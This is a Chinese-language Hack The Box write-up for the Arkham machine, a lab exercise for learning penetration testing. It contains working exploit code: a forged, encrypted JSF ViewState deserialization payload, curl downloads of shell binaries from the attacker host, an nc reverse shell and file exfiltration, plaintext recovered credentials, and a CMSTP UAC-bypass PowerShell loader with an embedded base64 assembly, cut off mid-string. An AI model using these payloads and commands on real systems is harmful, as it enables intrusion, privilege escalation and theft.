---
title: Arkham (Hack The Box Writeup)
date: 2022-10-15T23:03:21+08:00
draft: false
url: "/2022/10/15/arkham-hack-the-box-writeup/"
categories:
  - 資訊安全
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

URL : https://app.hackthebox.com/machines/179

先講結論，這是我最近打過 HTB 最硬的一題 …… ，這絕對不是 Medium 的機器，他難度絕對絕對有 Hard。我覺得這一題對於初學者，甚至是剛拿到 OSCP 的人應該都會覺得打得很痛苦 QWQ

這一題題目包含的知識點：

- LUKS 解密
- Tomcat Config 解析
- HMAC 簽章
- DES 加解密
- Java Viewstate 反序列化
- Bypass Windows Defender
- Microsoft Outlook email folder (ost) 解析
- Base64 圖片還原
- Invoke-command 切換使用者
- Bypass CLM
- CMSTP UAC Bypass

## SMB

有開 SMB

所以先匿名登上去

```bash
~/HTB/Arkham/new ᐅ smbclient.py 10.129.106.199
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# login meow
Password:
[*] GUEST Session Granted
```

發現可以存取 `BatShare`，裡面有一個 `appserver.zip`，載下來分析

```
# shares
ADMIN$
BatShare
C$
IPC$
Users
# use BatShare
# ls
drw-rw-rw-          0  Sun Feb  3 21:04:13 2019 .
drw-rw-rw-          0  Sun Feb  3 21:04:13 2019 ..
-rw-rw-rw-    4046695  Sun Feb  3 21:04:13 2019 appserver.zip
# get appserver.zip
```

解壓縮

```bash
~/HTB/Arkham/new ᐅ unzip appserver.zip
Archive:  appserver.zip
  inflating: IMPORTANT.txt
  inflating: backup.img
```

## LUKS Decrypt

發現 `backup.img` 裡面是一個 luks 的加密檔案

```bash
~/HTB/Arkham/new ᐅ file backup.img
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
```

luks 可以透過暴力破解的方式來解

[https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

這邊有點小通靈，看其他的 Writeup 得知密碼跟 batman 有關

所以我們可以自製 Wordlist

```bash
grep batman ~/WordLists/rockyou.txt | tee wordlist.txt
```

```bash
bruteforce-luks -t 10 -f wordlist.txt -v 5 backup.img
# .....

Password found: batmanforever
Tried passwords: 61
Tried passwords per second: 0.305000
Last tried password: batman82
```

就順利知道了它的密碼

接下來就是 mount 了

```bash
sudo cryptsetup open --type luks backup.img arkham
sudo mount /dev/mapper/arkham mount_point
```

把檔案抓出來後，先 unmount

```bash
cd mount_point/
cp -r Mask ..

sudo umount mount_point
sudo cryptsetup close arkham
```

在 `Mask/tomcat-stuff` 找到了 `web.xml.bak`

可以看到一點點的重點

```xml
org.apache.myfaces.SECRET
SnNGOTg3Ni0=

    
        org.apache.myfaces.MAC_ALGORITHM
        HmacSHA1
     

org.apache.myfaces.MAC_SECRET
SnNGOTg3Ni0=
```

我們知道了程式背後使用了 `HMAC SHA1`

而它們的 Key 如果用 base64 解開都是 `JsF9876-`

## Web

接下來看一下 Web

Site Map 可以看到一個奇怪的 `userSubscribe.faces`  
![](https://i.imgur.com/SjXSRpF.png)

進入後可以進行 Subscribe

![](https://i.imgur.com/DxQXeWT.png)

可以觀察到 `javax.faces.ViewState` 也許是有趣的東西

我們可以試著 Decode 看看

```python
import base64
from urllib.parse import quote, unquote

src = "wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D"
src_decode = unquote(src)

src_decode = base64.b64decode(src_decode.encode())

print(src_decode)
# b'\xc0z4\xc2b\xee\xe5\xc7\x88\xb4\x88\xbe#\xb5\xe4\x12-F\x01\xbe!\xd7e\x99\xf3\xde)\x03\xe6x8~\xdbr\x8d\xa3\\L\xb5E\x0cS\xa8\xb6.\xa2I\x8e\xefB\xad\x0e\xd9\xe0\x8c9\xb4\x98\xdc\xc0\xf6\xa1\xe3a\xea\xf1\xa3H\xd6\xef;\xb5\x99\xd2\x81^\xdcgOTf\x9de\x16L\x9c\x82\xb8\xd7\t\xbb\x11'
```

但發現看不懂 QQ

## Decrypt & Encrypt

但我們可以從先前的 config 猜測，他應該是一個加密搭配 Hmac sha1 的結果

![](https://i.imgur.com/rZjV6sj.png)

所以我們可以試著驗證看看，Decode 出來的結果總共有 92 個 Bytes，假設 MAC 是 SHA1 的話，那會有 20 個 Bytes，因此可以把這段切兩半

```python
message = src_decode[:-20]
mac = src_decode[-20:]
```

理論上我們有 key，也有演算法，我們可以單純靠 message 來生成他的 mac，如果前提假設正確的話 …..

```python
import base64
from urllib.parse import quote, unquote
import hmac
import hashlib

src = "wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D"
src_decode = unquote(src)

src_decode = base64.b64decode(src_decode.encode())

message = src_decode[:-20]
mac = src_decode[-20:]

key = b"JsF9876-"
res = hmac.new(key=key,msg=message,digestmod=hashlib.sha1)
print(mac) # b'\x99\xd2\x81^\xdcgOTf\x9de\x16L\x9c\x82\xb8\xd7\t\xbb\x11'
print(res.digest()) # b'\x99\xd2\x81^\xdcgOTf\x9de\x16L\x9c\x82\xb8\xd7\t\xbb\x11'
```

很順利的，我們猜到了！！

接下來要來通靈前半段，我們知道 key，知道 payload，但不知道加密演算法

我們知道 key 是 `JsF9876-` ， 長度是 8 bytes

常見的 AES 加密可以用 key 長度來分

- 16 bytes = AES-128
- 24 bytes = AES-192
- 32 bytes = AES-256

看起來都不符合，而 DES 的 Key Size 是 56 bits = 7 Bytes

但是，根據維基百科的英文版有說到

```
According to ANSI INCITS 92-1981
One bit in each 8-bit byte of the KEY may be utilized for error detection in key generation, distribution, and storage. Bits 8, 16,..., 64 are for use in ensuring that each byte is of odd parity
```

也就是說，DES 目前會吃 8 Bytes，而每一個 Bytes 的最後一個 Bit (8th, 16th, 32th …(從1開始數的))作為 parity 使用。

不過根據 PyCryptodome 的 Document 來講，`8 bits were used for integrity (now they are ignored)`，也就是說現在他不會去 check parity 了。

不管了，講了這麼多，我們可以試著用 DES 來解看看

但 DES 又有 ECB, CBC, CFB, OFB, CTR, OPENPGP, EAX 這麼多種方法

最簡單的方法就是一個一個測一次，還好這次運氣不錯，第一個 mode ECB 就成功了

```python
from Crypto.Cipher import DES

# key = b"JsF9876-"
message = b'\xc0z4\xc2b\xee\xe5\xc7\x88\xb4\x88\xbe#\xb5\xe4\x12-F\x01\xbe!\xd7e\x99\xf3\xde)\x03\xe6x8~\xdbr\x8d\xa3\\L\xb5E\x0cS\xa8\xb6.\xa2I\x8e\xefB\xad\x0e\xd9\xe0\x8c9\xb4\x98\xdc\xc0\xf6\xa1\xe3a\xea\xf1\xa3H\xd6\xef;\xb5'

key = b"JsF9876-"
d = DES.new(key=key,mode=DES.MODE_ECB)
r = d.decrypt(message)
print(r)
```

```python
b'\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x011pt\x00\x12/userSubscribe.jsp\x02\x02'
```

回到前面說的，不 check parity bit, 我們可以做一個實驗，我們在不改動前 7 bit 的前提下，`JsF9876-` 可以變為 `KrG8967,`，而且解密答案是一樣的

```python
In [5]: [bin(ord(i)) + f": {i}" for i in "JsF9876-"]
Out[5]: 
['0b1001010: J',
 '0b1110011: s',
 '0b1000110: F',
 '0b111001: 9',
 '0b111000: 8',
 '0b110111: 7',
 '0b110110: 6',
 '0b101101: -']

 In [7]: [bin(ord(i)) + f": {i}" for i in "KrG8967,"]
Out[7]: 
['0b1001011: K',
 '0b1110010: r',
 '0b1000111: G',
 '0b111000: 8',
 '0b111001: 9',
 '0b110110: 6',
 '0b110111: 7',
 '0b101100: ,']
```

```python
from Crypto.Cipher import DES

message = b'\xc0z4\xc2b\xee\xe5\xc7\x88\xb4\x88\xbe#\xb5\xe4\x12-F\x01\xbe!\xd7e\x99\xf3\xde)\x03\xe6x8~\xdbr\x8d\xa3\\L\xb5E\x0cS\xa8\xb6.\xa2I\x8e\xefB\xad\x0e\xd9\xe0\x8c9\xb4\x98\xdc\xc0\xf6\xa1\xe3a\xea\xf1\xa3H\xd6\xef;\xb5'

# key = b"JsF9876-"
key = b"KrG8967,"
d = DES.new(key=key,mode=DES.MODE_ECB)
r = d.decrypt(message)
print(r)
# b'\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x011pt\x00\x12/userSubscribe.jsp\x02\x02'
```

好，離題了，我們從解開的 byte 看到了 `\xac\xed\x00\x05` 開頭，可以確認他就是一個 Java 的反序列化結果

再來我們可以先做一件很無聊的事情，把解密的東西重新加密回去，簽一個 hmac，照理來說應該會跟最原始的 payload 一樣才對。

```python
from Crypto.Cipher import DES
import hmac
import hashlib
import base64
from urllib.parse import unquote

src = "wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D"
src_decode = unquote(src)
src_decode = base64.b64decode(src_decode.encode())

message = src_decode[:-20]
mac = src_decode[-20:]

key = b"JsF9876-"
d = DES.new(key=key,mode=DES.MODE_ECB)
r = d.decrypt(message)
# r 是解密後的結果

d = DES.new(key=key,mode=DES.MODE_ECB)
r1 = d.encrypt(r)
# r1 是加密後的結果
res = hmac.new(key=key,msg=r1,digestmod=hashlib.sha1)
# 幫 r1 簽章
payload = r1 + res.digest()

print(src_decode == payload)
```

答案是 True!!

所以我們可以自己定義一個 function，只要送入 payload 就可以幫我們加密 & 簽 hmac

```python
def encrypt_and_hmac(data): # data is bytes
    key = b"JsF9876-"
    d = DES.new(key=key,mode=DES.MODE_ECB)
    r1 = d.encrypt(data)
    res = hmac.new(key=key,msg=r1,digestmod=hashlib.sha1)
    return r1 + res.digest()
```

接下來我們就要開始產 payload 了！

因為在 m1 mac 上面的 java 版本問題，會導致 ysoserial 怪怪的，所以我使用 Docker 來解這個問題。

```docker
FROM openjdk:11.0.16
COPY ysoserial-all.jar /root/ysoserial-all.jar

ENTRYPOINT ["java", "-jar", "/root/ysoserial-all.jar"]
# docker build . -t ysoserial:meow
```

在執行這個 Docker 時，有個需要注意的點是，run 的過程千萬不要順手帶上 `-it`，不然 serial 的結果的 `\x0a` 會變成 `\x0d\x0a`

輸入 `docker run --rm ysoserial:meow list` 可以看到常見的 ysoserial Payload，最常見也最通用的是 `CommonsCollections1` 到 `CommonsCollections7`

不過我們不知道哪一個可以用 QQ，不同情境適用不同的內容，而產 payload 的方法大致是

```bash
docker run --rm ysoserial:meow CommonsCollections1 'ping 10.10.16.35'
```

可以寫個小腳本把所有序列化結果都存出來

```python
def generate_payload():
    for i in range(1,7+1):
        print(f"Generating CommonsCollections{i}")
        os.popen(f"docker run --rm ysoserial:meow CommonsCollections{i} 'ping 10.10.16.35' > payloads/{i}.ser")
```

再來需要把 payload 給加密，上 hmac 並轉 base64 後透過 Requests 送出 ，程式跑下去會噴一個錯誤 QQ

```
ValueError: Data must be aligned to block boundary in ECB mode
```

也就是說，根據 ECB，我們需要把 Payload 進行 padding

```python
from Crypto.Util.Padding import pad
# import ... 略

def encrypt_and_hmac(data): # data is bytes
    key = b"JsF9876-"
    d = DES.new(key=key,mode=DES.MODE_ECB)
    r1 = d.encrypt(pad(data,8))
    res = hmac.new(key=key,msg=r1,digestmod=hashlib.sha1)
    return r1 + res.digest()
```

Padding Size 預設 DES 每個 Block 就是 64 Bit，所以選擇 8

## Web Exploit

再來我們就可以寫一個迴圈來爆看看我們能用的 Payload 是哪些，首先先開 tcpdump 收 icmp

```bash
sudo tcpdump -i utun7 icmp
```

```python
from Crypto.Cipher import DES
import hmac
import hashlib
import base64
from urllib.parse import unquote
import os
import requests
from Crypto.Util.Padding import pad

def encrypt_and_hmac(data): # data is bytes
    key = b"JsF9876-"
    d = DES.new(key=key,mode=DES.MODE_ECB)
    r1 = d.encrypt(pad(data,8))
    res = hmac.new(key=key,msg=r1,digestmod=hashlib.sha1)
    return r1 + res.digest()

def generate_payload():
    for i in range(1,7+1):
        print(f"Generating CommonsCollections{i}")
        os.popen(f"docker run --rm ysoserial:meow CommonsCollections{i} 'ping 10.10.16.35' > payloads/{i}.ser")
# generate_payload()

def send_payload(i):
    payload = open(f"payloads/{i}.ser","rb").read()
    encrypted_payload = encrypt_and_hmac(payload)
    base64_payload = base64.b64encode(encrypted_payload).decode()

    burp0_url = "http://10.129.106.199:8080/userSubscribe.faces"
    burp0_cookies = {"JSESSIONID": "DFE45108C21A6F29EEED16F9DE849820"}
    burp0_data = {"j_id_jsp_1623871077_1:email": "meowmeow", 
                "j_id_jsp_1623871077_1:submit": "SIGN UP", 
                "j_id_jsp_1623871077_1_SUBMIT": "1", 
                "javax.faces.ViewState": base64_payload}

    requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data)

for i in range(1,7+1):
    send_payload(i)
```

跑下去可以確定我們有收到 Payload

```bash
17:28:23 steven@StevendeMacBook-Pro.local new sudo tcpdump -i utun7 icmp            130 ↵
Password:
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on utun7, link-type NULL (BSD loopback), capture size 262144 bytes
17:28:50.041617 IP 10.129.106.199 > 10.10.16.35: ICMP echo request, id 1, seq 21, length 40
17:28:50.041681 IP 10.10.16.35 > 10.129.106.199: ICMP echo reply, id 1, seq 21, length 40
17:28:50.324666 IP 10.129.106.199 > 10.10.16.35: ICMP echo request, id 1, seq 22, length 40
17:28:50.324747 IP 10.10.16.35 > 10.129.106.199: ICMP echo reply, id 1, seq 22, length 40
17:28:50.697327 IP 10.129.106.199 > 10.10.16.35: ICMP echo request, id 1, seq 23, length 40
17:28:50.697401 IP 10.10.16.35 > 10.129.106.199: ICMP echo reply, id 1, seq 23, length 40
17:28:51.055909 IP 10.129.106.199 > 10.10.16.35: ICMP echo request, id 1, seq 24, length 40
17:28:51.055991 IP 10.10.16.35 > 10.129.106.199: ICMP echo reply, id 1, seq 24, length 40
```

那接下來其實也很簡單，我們可以用類似玩終極密碼的方法來找我們能用的 Payload 是哪個

```python
for i in range(1,3+1):
    send_payload(i)
# 失敗

for i in range(4,7+1):
    send_payload(i)
# 成功

send_payload(5)
# 成功
```

確定 `CommonsCollections5` 可用後，我們可以把 Exploit 寫的更 Friendly 一點

```python
from Crypto.Cipher import DES
import hmac
import hashlib
import base64
from urllib.parse import unquote
import os
import requests
from Crypto.Util.Padding import pad

def encrypt_and_hmac(data): # data is bytes
    key = b"JsF9876-"
    d = DES.new(key=key,mode=DES.MODE_ECB)
    r1 = d.encrypt(pad(data,8))
    res = hmac.new(key=key,msg=r1,digestmod=hashlib.sha1)
    return r1 + res.digest()

def generate_payload(payload):
    serialize = os.popen(f"docker run --rm ysoserial:meow CommonsCollections5 '{payload}' | base64").read()
    serialize_b64 = base64.b64decode(serialize.encode())
    return serialize_b64

def send_payload(payload):
    encrypted_payload = encrypt_and_hmac(payload)
    base64_payload = base64.b64encode(encrypted_payload).decode()

    burp0_url = "http://10.129.106.199:8080/userSubscribe.faces"
    burp0_cookies = {"JSESSIONID": "DFE45108C21A6F29EEED16F9DE849820"}
    burp0_data = {"j_id_jsp_1623871077_1:email": "meowmeow", 
                "j_id_jsp_1623871077_1:submit": "SIGN UP", 
                "j_id_jsp_1623871077_1_SUBMIT": "1", 
                "javax.faces.ViewState": base64_payload}

    requests.post(burp0_url, cookies=burp0_cookies, data=burp0_data)

payload = generate_payload("ping 10.10.16.35")
send_payload(payload)
```

以為接著這樣就順利 RCE 了嗎？不，接下來我又踩了一堆雷 QQ

首先我跑了

```bash
certutil -urlcache -f  http://10.10.16.35
```

發現收不到 Request，有可能是有開 Defender，或是透過某些奇怪的方法 Disable 了 certutil

SMB 也都不行 QQQ

最後發現電腦裡面有裝 curl

```bash
cmd /c curl 10.10.16.35
```

但是 msfvenom 的 payload 也都會被吃掉 QQ

因此我使用了 cyku 大大的 [tsh](https://github.com/CykuTW/tsh-go)

```bash
cmd /c curl 10.10.16.35/tshd_windows_amd64.exe -o C:/Users/Public/tshd.exe"
cmd /c C:/Users/Public/tshd.exe -c 10.10.16.35 -p 9988
```

然後就收回 shell 了！！

```bash
StevendeMacBook-Pro:new $ tsh -p 9988 cb
Waiting for the server to connect...connected.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\tomcat\apache-tomcat-8.5.37\bin>

C:\>whoami
arkham\alfred
```

Alfred 的桌面就能拿到 `user.txt`

## 提權

在 `C:\Users\Alfred\Downloads\backups` 底下可以看到一個 `backup.zip`

我們可以開一個 SMB Server 來收檔案

… 嗎？

```bash
C:\Users\Alfred\Downloads\backups>copy backup.zip \\10.10.16.35\meow
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your
 PC from unsafe or malicious devices on the network.
        0 file(s) copied.
```

不行 QQ

那我們可以丟一隻 nc 進去幫我們

```bash
curl 10.10.16.35/nc.exe -o nc.exe
```

```bash
# attacker
ncat -nlvp 7766 > backup.zip

# victim
nc.exe 10.10.16.35 7766  file alfred@arkham.local.ost
alfred@arkham.local.ost: Microsoft Outlook email folder
```

OST 是 Outlook 檔案，可以使用 Linux 的 `readpst` 工具來解碼

```bash
steven@lima-ubuntu-amd64:/Users/steven/HTB/Arkham/new/backup$ readpst alfred@arkham.local.ost
Opening PST file and indexes...
Processing Folder "Deleted Items"
Processing Folder "Inbox"
Processing Folder "Outbox"
Processing Folder "Sent Items"
Processing Folder "Calendar"
Processing Folder "Contacts"
Processing Folder "Conversation Action Settings"
Processing Folder "Drafts"
Processing Folder "Journal"
Processing Folder "Junk E-Mail"
Processing Folder "Notes"
Processing Folder "Tasks"
Processing Folder "Sync Issues"
Processing Folder "RSS Feeds"
Processing Folder "Quick Step Settings"
    "alfred@arkham.local.ost" - 15 items done, 0 items skipped.
    "Inbox" - 0 items done, 7 items skipped.
    "Calendar" - 0 items done, 3 items skipped.
Processing Folder "Conflicts"
Processing Folder "Local Failures"
Processing Folder "Server Failures"
    "Sync Issues" - 3 items done, 0 items skipped.
    "Drafts" - 1 items done, 0 items skipped.
```

解開後會看到一個 `Drafts.mbox` 檔案， 用 VSCode 打開可以看到類似 Email 跟 HTML 混雜的東西

第 554 行可以看到 base64 的 png 圖片

![](https://i.imgur.com/ZcVaiCI.png)

我們可以寫一個 py 還原 Base64

```python
import base64

data = b"""iVBORw0KGgoAAAANSUhEUgAAAqUAAAFXCAIAAAAUCKDqAAAAAXNSR0IArs4c6QAAJwVJREFUeF7t
3V+oZdd5GPCjUmibujISRUNh5GhiCya2hI0lVXSoEwXXCRMoqpUXyzR6MFaUIlwh2S9+kB+sB7/Y
ElNjWskmDzJ0/FKpItCBGDGSBROGKMYgoaqM3XEsQZBpLazUTelLu8/Z9+677/679jn7O3edO7/L
#... 略
"""

d = base64.b64decode(data)
with open("decoded.png",'wb') as f:
    f.write(d)
```

接下來就能看到這張圖了

![](https://i.imgur.com/croHOKJ.png)

到目前為止，我們取得了 batman 的帳密

`batman` / `Zx^#QZX+T!123`

## 切換使用者

從 net user 可以發現他是 Local Admin 理論上我們只要切換過去應該就是 Admin 了！！！

接下來經過了種種嘗試，發現 batman 摸不到 Public，但他有開 SMB，所以我們可以用 smb 上去！！

```
# login batman
Password:
[*] USER Session Granted
# shares
ADMIN$
BatShare
C$
IPC$
Users
# use Users
# ls
drw-rw-rw-          0  Sun Feb  3 21:24:10 2019 .
drw-rw-rw-          0  Sun Feb  3 21:24:10 2019 ..
drw-rw-rw-          0  Sat Oct 15 15:13:25 2022 Batman
drw-rw-rw-          0  Fri Feb  1 10:49:06 2019 Default
-rw-rw-rw-        174  Sat Feb  2 00:10:07 2019 desktop.ini
# cd Batman
# put nc.exe
```

但用 cpau 還是跑不起來，所以改用 powershell 的方法

```powershell
powershell
$username = 'batman'
$password = 'Zx^#QZX+T!123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Invoke-command -computername ARKHAM -credential $credential -scriptblock {cmd.exe /c C:\Users\Batman\nc.exe -e cmd.exe 10.10.16.3
5 9977 }
```

收到 Reverse shell 後再轉 tsh (一樣用 smb 丟上 batman 家目錄)

```bash
tshd_windows_amd64.exe -c 10.10.16.35 -p 9966
```

就可以拿到 batman 的 shell 了！

```bash
C:\Users\Batman>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

但發現有 UAC QQQ

不過其實可以用 SMB 直接取 Flag，但這樣好弱ㄛ，我還是認真打吧

```bash
C:\Users\Batman>type \\localhost\c$\users\administrator\desktop\root.txt
636783f913109f2809701e8545ef4fdb
```

## UAC Bypass

這邊我預計會使用 CMSTP 的 UAC Bypass 方法

我參考了 https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html

直接採用 Weaponizing with PowerShell 的解法

```powershell
function Bypass-UAC
{
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$Command
    )
    if(-not ([System.Management.Automation.PSTypeName]'CMSTPBypass').Type)
    {
        [Reflection.Assembly]::Load([Convert]::FromBase64String("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QnlwYXNzLmRsbABDTVNUUEJ5cGFzcwBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AEluZkRhdGEAU2hvd1dpbmRvdwBTZXRGb3JlZ3JvdW5kV2luZG93AEJpbmFyeVBhdGgAU2V0SW5mRmlsZQBFeGVjdXRlAFNldFdpbmRvd0FjdGl2ZQAuY3RvcgBoV25kAG5DbWRTaG93AENvbW1hbmRUb0V4ZWN1dGUAUHJvY2Vzc05hbWUAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAENNU1RQLVVBQy1CeXBhc3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAERsbEltcG9ydEF0dHJpYnV0ZQB1c2VyMzIuZGxsAFN5c3RlbS5JTwBQYXRoAEdldFJhbmRvbUZpbGVOYW1lAENoYXIAQ29udmVydABUb0NoYXIAU3RyaW5nAFNwbGl0AFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAQXBwZW5kAFJlcGxhY2UAVG9TdHJpbmcARmlsZQBXcml0ZUFsbFRleHQARXhpc3RzAENvbnNvbGUAV3JpdGVMaW5lAENvbmNhdABTeXN0ZW0uRGlhZ25vc3RpY3MAUHJvY2Vzc1N0YXJ0SW5mbwBzZXRfQXJndW1lbnRzAHNldF9Vc2VTaGVsbEV4ZWN1dGUAUHJvY2VzcwBTdGFydABJbnRQdHIAWmVybwBvcF9FcXVhbGl0eQBTeXN0ZW0uV2luZG93cy5Gb3JtcwBTZW5kS2V5cwBTZW5kV2FpdABHZXRQcm9jZXNzZXNCeU5hbWUAUmVmcmVzaABnZXRfTWFpbldpbmRvd0hhbmRsZQAuY2N0b3IAAAMuAAAfQwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAZQBtAHAAAANcAAAJLgBpAG4AZgAAKVIARQBQAEwAQQBDAEUAXwBDAE8ATQBNAEEATgBEAF8ATABJAE4ARQAAQUMAbwB1AGwAZAAgAG4AbwB0ACAAZgBpAG4AZAAgAGMAbQBzAHQAcAAuAGUAeABlACAAYgBpAG4AYQByAHkAIQAAMVAAYQB5AGwAbwBhAGQAIABmAGkAbABlACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgAAAJLwBhAHUAIAAAC2MAbQBzAHQAcAAAD3sARQBOAFQARQBSAH0AAISPWwB2AGUAcgBzAGkAbwBuAF0ADQAKAFMAaQBnAG4AYQB0AHUAcgBlAD0AJABjAGgAaQBjAGEAZwBvACQADQAKAEEAZAB2AGEAbgBjAGUAZABJAE4ARgA9ADIALgA1AA0ACgANAAoAWwBEAGUAZgBhAHUAbAB0AEkAbgBzAHQAYQBsAGwAXQANAAoAQwB1AHMAdABvAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAD0AQwB1AHMAdABJAG4AcwB0AEQAZQBzAHQAUwBlAGMAdABpAG8AbgBBAGwAbABVAHMAZQByAHMADQAKAFIAdQBuAFAAcgBlAFMAZQB0AHUAcABDAG8AbQBtAGEAbgBkAHMAPQBSAHUAbgBQAHIAZQBTAGUAdAB1AHAAQwBvAG0AbQBhAG4AZABzAFMAZQBjAHQAaQBvAG4ADQAKAA0ACgBbAFIAdQBuAFAAcgBlAFMAZQB0AHUAcABDAG8AbQBtAGEAbgBkAHMAUwBlAGMAdABpAG8AbgBdAA0ACgA7ACAAQwBvAG0AbQBhAG4AZABzACAASABlA